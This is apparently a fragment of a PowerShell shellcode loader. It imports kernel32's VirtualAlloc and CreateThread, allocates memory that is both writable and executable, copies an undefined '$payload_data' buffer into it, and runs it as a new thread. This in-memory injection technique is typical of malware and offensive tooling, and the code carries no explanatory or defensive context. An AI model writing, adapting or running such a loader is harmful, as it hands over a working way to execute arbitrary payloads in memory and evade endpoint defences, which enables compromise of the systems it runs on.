[void] [System.Reflection.Assembly]::LoadWithPartialName("System.Runtime.InteropServices")
$MethodDefinition =
@'
[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, IntPtr lpStartAddress, IntPtr param, UInt32 dwCreationFlags, UInt32 lpThreadId);
[DllImport("kernel32")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
'@

$Kernel32 = Add-Type -MemberDefinition $MethodDefinition -Name 'Kernel32' -Namespace 'Win32' -PassThru


[IntPtr]$ptr = $Kernel32::VirtualAlloc(0, [int][Math]::Floor($length / 8), 0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($payload_data, 0, $ptr, [int][Math]::Floor($length / 8))
$Kernel32::CreateThread(0, 0, $ptr, 0, 0, 0)
